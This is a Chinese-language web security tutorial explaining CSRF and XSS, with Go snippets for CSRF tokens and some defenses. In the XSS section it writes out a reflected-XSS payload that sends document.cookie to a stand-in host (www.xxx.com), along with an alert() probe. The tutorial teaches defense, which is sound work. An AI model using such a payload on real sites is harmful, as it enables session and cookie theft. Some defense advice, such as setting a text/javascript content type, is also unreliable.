# WEB安全

## CSRF(Cross-site request forgery)

中文名称：跨站请求伪造。
攻击方式：攻击者可以盗用你的登录信息，以你的身份模拟发送各种请求。
例子：当用户登录网络银行去查询存款余额的时候，还没有退出的时候，就点击了QQ发来的消息，那么该用于账户中的资金就有可能转移到攻击者指定的账户中。

## CSRF原理

原理图如下：
![](https://raw.githubusercontent.com/astaxie/build-web-application-with-golang/master/zh/images/9.1.csrf.png)
从可以看出，要完成一次`CSRF`攻击，受害者必须完成下面的两个步骤：
1. 登录信任的网站A,并且在本地产生cookie
2. 在不退出A的情况下，访问危险网站B

`CSRF`主要是因为WEB隐式身份验证机制，WEB身份验证机制虽然可以保证一个请求是来自某个用户的浏览器，但是不能保证这个请求是用户批准发出的。

## CSRF的防范

### 在服务端

1. 正确使用`GET`,`POST`和`COOKIE`
2. 在非`GET`请求中添加伪随机数

- 在使用GET的时候，用作查看，列举，展示等不需要改变资源属性的时候
- POST常用于下达订单，改变资源属性或者下达一些其他的命令 

我们限制修改只能使用`POST`，当GET方式请求的时候就拒绝访问，所以上图中的GET方式就可以避免了。
但是`POST`的方式也是可以模拟的,因此我们还要使用第二个步骤，给非GET请求添加伪随机数。
非GET请求中添加伪随机数一般有下面三个方式：
1. 为每一用户生成唯一的`cookie token`,所有的表单都包含同一个伪随机数。因为攻击者理论上是不能获得用户的`cookie`的,所以表单的数据也就构造失败了。但是`XSS`是可以获得用户的`cookie`的
2. 每个请求输入验证码，这种方式是最完美，但是用户的体验是最差的
3. 不同的表单包含不同的伪随机值(可以通过MD5(时间戳)去生成,然后保存在服务器的session中，刷新就会改变)，服务端进行验证。
生成随机数`token`:
```javascript
h := md5.New()
io.WriteString(h, strconv.FormatInt(crutime, 10))
io.WriteString(h, "ganraomaxxxxxxxxx")
token := fmt.Sprintf("%x", h.Sum(nil))

t, _ := template.ParseFiles("login.gtpl")
t.Execute(w, token)
```	
输出`token`：
```HTML
<input type="hidden" name="token" value="{{.}}">
```
验证`token`:
```node
r.ParseForm()
token := r.Form.Get("token")
if token != "" {
	//验证token的合法性
} else {
	//不存在token报错
}
```

## XSS(Cross-Site Scripting)

允许攻击者将恶意代码植入到提供给其他用户使用的页面中。
XSS的攻击目标是为了盗取存储在用户端的`cookie`和或者其他网站用于识别客户端身份的敏感信息。一旦获取到合法用户的信息后，攻击者甚至可以假冒合法用户与网站进行交互。

XSS通常可以分为下面两种：
1. 存储型XSS：主要出现在让用户进行输入的地方，包括留言，评论或者博客日志和各类表单等。应用程序从数据库中查询书数据，在页面中显示出来，攻击者在相应的页面输入恶意的脚本数据后，用户浏览此类页面就会收到攻击。流程可以描述为：恶意用户的HTML输入 -> 进入数据库 -> WEB页面进行显示 -> 用户浏览器(操作收到攻击)
2. 反射性XSS：将脚本代码加入URL地址的参数中，请求参数进入程序后在页面中直接输出，用户点击恶意的网站就可能收到攻击

XSS现在主要的手段和目的如下：
1. 盗用cookie，获取敏感信息
2. 利用`iframe`,`frame`,`XMLHTTPRequest`或者`FLASH`方式，以(被攻击者)用户的身份执行一些管理动作
3. 利用可被攻击的域收到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如：不正当的投票

### XSS原理

Web应用未对用户提交请求的数据做充分的检查过滤，允许用户在提交的数据中掺入HTML代码(最主要的是“>”、“<”)，并将未经转义的恶意代码输出到第三方用户的浏览器解释执行，是导致XSS漏洞的产生原因。
接下来以反射性XSS举例说明XSS的过程：现在有一个网站，根据参数输出用户的名称，例如访问url：http://127.0.0.1/?name=astaxie，就会在浏览器输出如下信息：
```java
hello astaxie
```
如果我们传递这样的url：`http://127.0.0.1/?name=&#60;script&#62;alert(&#39;astaxie,xss&#39;)&#60;/script&#62;`,这时你就会发现浏览器跳出一个弹出框，这说明站点已经存在了XSS漏洞。那么恶意用户是如何盗取Cookie的呢？与上类似，如下这样的url：`http://127.0.0.1/?name=&#60;script&#62;document.location.href='http://www.xxx.com/cookie?'+document.cookie&#60;/script&#62;`，这样就可以把当前的cookie发送到指定的站点

### XSS的防范
答案很简单，坚决不要相信用户的任何输入，并过滤掉输入中的所有特殊字符。这样就能消灭绝大部分的XSS攻击。
目前防御XSS主要有如下几种方式：
1. 过滤特殊字符 使用文本传输(`text/template`)
2. 使用HTTP头指定类型 `w.Header().Set("Content-Type","text/javascript")`(这样就可以让浏览器解析javascript代码，而不会是html输出。)

